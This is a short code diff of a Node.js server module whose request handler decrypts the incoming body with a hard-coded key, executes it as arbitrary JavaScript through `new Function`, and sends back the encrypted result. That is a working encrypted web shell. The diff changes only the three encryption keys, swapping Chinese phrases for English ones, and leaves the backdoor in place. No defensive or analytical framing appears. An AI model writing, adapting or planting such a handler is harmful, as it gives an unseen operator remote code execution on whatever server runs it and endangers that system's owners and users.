@@ -14,12 +14,12 @@ module.exports = {
         })
         req.on("end",function(data){
           new Promise(function(resolve,reject){
-             new Function("return " + String(crypt.decrypt(Buffer.concat(chunks), "多少风沙，多少汗水。多少辛酸，带走我的泪。")).replace(/^return\s+/,"")).apply(this).then(resolve).catch(reject);
+             new Function("return " + String(crypt.decrypt(Buffer.concat(chunks), "it\'s raining outside and I do miss you")).replace(/^return\s+/,"")).apply(this).then(resolve).catch(reject);
           }).then(function(...args){
-              return res.end(crypt.encrypt(JSON.stringify(args), "请你不要再迷恋我，我只是一个传说"))
+              return res.end(crypt.encrypt(JSON.stringify(args), "one more kiss that is no crazy"))
           }).catch(function(e){
               res.writeHead(500,{})
-              return res.end(crypt.encrypt(String(e), "你看得到我打在屏幕上的字，却看不到我落在键盘上的泪。"))
+              return res.end(crypt.encrypt(String(e), "A error happened"));
           });
         });
     }
